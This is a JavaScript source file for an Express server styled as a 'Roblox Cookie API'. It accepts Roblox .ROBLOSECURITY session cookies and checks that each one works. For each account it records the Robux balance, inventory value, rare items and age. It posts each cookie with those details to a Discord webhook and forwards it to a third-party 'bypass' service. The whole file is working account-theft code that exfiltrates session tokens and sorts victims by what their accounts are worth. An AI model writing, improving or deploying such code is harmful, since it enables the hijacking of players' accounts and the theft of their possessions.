const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
// IMPORTANT: Replace this with your actual webhook URL or use environment variable
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    KORBLOX_RIGHT_LEG: 139607718,
    KORBLOX_LEFT_LEG: 139607673,
    KORBLOX_RIGHT_ARM: 139607625,
    HEADLESS_HEAD: 134967443,
    HEADLESS_BUNDLE_ID: 201,
    EIGHT_BIT_CROWN: 10159600649,
};

console.log('========================================');
console.log('🔧 WEBHOOK URL:', WEBHOOK_URL);
console.log('========================================');

// ========== HELPER FUNCTIONS ==========

async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

async function checkAge13Plus(cookie, userId) {
    try {
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        results.hasKorblox = results.korbloxParts.length === 3;
        
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
    }
    
    return results;
}

async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// IMPROVED WEBHOOK FUNCTION WITH BETTER DEBUGGING
async function sendToWebhook(data) {
    console.log('========================================');
    console.log('📤 ATTEMPTING TO SEND WEBHOOK');
    console.log('========================================');
    
    // Check if webhook URL is configured
    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://your-webhook-url-here.com' || WEBHOOK_URL === 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN') {
        console.error('❌ WEBHOOK URL NOT CONFIGURED!');
        console.error('Current WEBHOOK_URL:', WEBHOOK_URL);
        console.error('Please set the WEBHOOK_URL environment variable in Render');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    console.log('✅ Webhook URL found:', WEBHOOK_URL.substring(0, 50) + '...');
    console.log('📦 Data to send:', JSON.stringify(data, null, 2).substring(0, 200));
    
    try {
        // Create a simple text message first (more reliable than embeds)
        const simpleMessage = {
            content: `**🍪 Cookie Verification Result**\n` +
                    `Status: ${data.success ? '✅ SUCCESS' : '❌ FAILED'}\n` +
                    `Cookie: \`${data.cookie ? data.cookie.substring(0, 50) : 'No cookie'}${data.cookie && data.cookie.length > 50 ? '...' : ''}\`\n` +
                    `${data.username ? `Username: ${data.username}\n` : ''}` +
                    `${data.userId ? `User ID: ${data.userId}\n` : ''}` +
                    `${data.error ? `Error: ${data.error}\n` : ''}` +
                    `Time: ${new Date().toISOString()}`
        };
        
        console.log('📨 Sending webhook request...');
        const response = await axios.post(WEBHOOK_URL, simpleMessage, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });
        
        console.log('✅ WEBHOOK SUCCESS! Status:', response.status);
        console.log('========================================');
        return { success: true, status: response.status };
        
    } catch (error) {
        console.error('❌ WEBHOOK FAILED!');
        console.error('Error message:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
            console.error('Response data:', JSON.stringify(error.response.data));
        }
        console.log('========================================');
        return { success: false, error: error.message, details: error.response?.data };
    }
}

// ========== MAIN API ENDPOINTS ==========

app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    console.log('========================================');
    console.log('🔍 NEW VERIFICATION REQUEST');
    console.log('Cookie received:', cookie ? cookie.substring(0, 30) + '...' : 'No cookie');
    console.log('========================================');
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    let responseData = {
        cookie: cookie,
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        console.log('Step 1: Verifying cookie...');
        const verification = await verifyCookie(cookie);
        
        if (!verification.valid) {
            responseData.error = verification.error;
            console.log('❌ Cookie is invalid:', verification.error);
            
            // SEND WEBHOOK FOR INVALID COOKIE
            console.log('📤 Sending webhook for INVALID cookie...');
            const webhookResult = await sendToWebhook(responseData);
            console.log('Webhook result:', webhookResult);
            
            return res.status(401).json({ 
                success: false, 
                error: verification.error,
                cookie: cookie,
                webhookSent: webhookResult.success
            });
        }
        
        console.log(`✅ Cookie valid for: ${verification.username}`);
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        console.log('Step 2: Checking age...');
        responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        console.log('Step 3: Fetching user data...');
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        console.log('Step 4: Bypassing extensions...');
        const bypassResult = await bypassExtensions(cookie);
        
        responseData.robuxBalance = robuxBalance;
        responseData.rap = userRAP;
        responseData.daysSinceCreation = userSummary.daysSinceCreation;
        responseData.inventory = {
            hasKorblox: inventoryItems.hasKorblox,
            hasHeadless: inventoryItems.hasHeadless,
            hasEightBitCrown: inventoryItems.hasEightBitCrown,
            korbloxPartsOwned: inventoryItems.korbloxParts.length,
            totalKorbloxParts: 3
        };
        responseData.summary = {
            displayName: userSummary.displayName,
            friendCount: userSummary.friendCount,
            groupCount: userSummary.groupCount,
            accountAge: userSummary.createdDate,
            description: userSummary.description,
            isBanned: userSummary.isBanned
        };
        responseData.bypassResult = bypassResult;
        
        // SEND WEBHOOK FOR VALID COOKIE
        console.log('📤 Sending webhook for VALID cookie...');
        const webhookResult = await sendToWebhook(responseData);
        console.log('Webhook result:', webhookResult);
        
        console.log('📦 Sending response to client');
        res.json({
            ...responseData,
            webhookSent: webhookResult.success
        });
        
    } catch (error) {
        console.error('Server error:', error);
        responseData.error = error.message;
        
        // SEND WEBHOOK FOR ERROR
        console.log('📤 Sending webhook for ERROR...');
        await sendToWebhook(responseData);
        
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message,
            cookie: cookie
        });
    }
});

// Test webhook endpoint
app.post('/api/test-webhook', async (req, res) => {
    console.log('========================================');
    console.log('🧪 TESTING WEBHOOK');
    console.log('========================================');
    
    const testData = {
        cookie: "test_cookie_12345_example_cookie_value_for_testing",
        success: true,
        username: "Test User",
        userId: 123456789,
        daysSinceCreation: 100,
        rap: 10000,
        robuxBalance: 2500,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: false,
            hasEightBitCrown: true
        },
        summary: {
            displayName: "TestDisplay",
            friendCount: 50,
            groupCount: 3
        },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    
    res.json({ 
        webhookSent: result.success, 
        message: result.success ? "✅ Webhook test sent successfully!" : "❌ Webhook failed",
        error: result.error,
        details: result.details
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    const isWebhookConfigured = WEBHOOK_URL && 
                                WEBHOOK_URL !== 'https://your-webhook-url-here.com' && 
                                WEBHOOK_URL !== 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
    
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        webhookConfigured: isWebhookConfigured,
        webhookUrl: isWebhookConfigured ? WEBHOOK_URL.substring(0, 30) + '...' : 'NOT CONFIGURED'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        endpoints: [
            'POST /api/verify-cookie - Full verification',
            'POST /api/validate-cookie - Quick validation',
            'POST /api/test-webhook - Test webhook',
            'GET /health - Health check'
        ]
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health check: http://localhost:${PORT}/health`);
    console.log(`📍 Verify endpoint: POST http://localhost:${PORT}/api/verify-cookie`);
    console.log(`📍 Webhook URL: ${WEBHOOK_URL === 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN' ? '⚠️ USING DEFAULT - PLEASE CONFIGURE' : '✅ Configured'}`);
    console.log('========================================');
});

module.exports = app;
